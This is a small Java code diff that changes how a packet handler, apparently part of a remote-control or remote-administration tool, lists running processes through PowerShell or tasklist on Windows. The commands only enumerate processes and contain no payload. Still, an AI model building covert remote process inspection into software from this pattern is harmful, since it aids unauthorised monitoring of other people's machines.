@@ -58,7 +58,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			WindowsVersion version = wos.getVersion();
 
 			if (version.ordinal() >= WindowsVersion.WINVISTA.ordinal()) {
-				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-List -Property *" });
+				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-Table -Property name,id,path -AutoSize" });
 			} else {
 				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
 			}
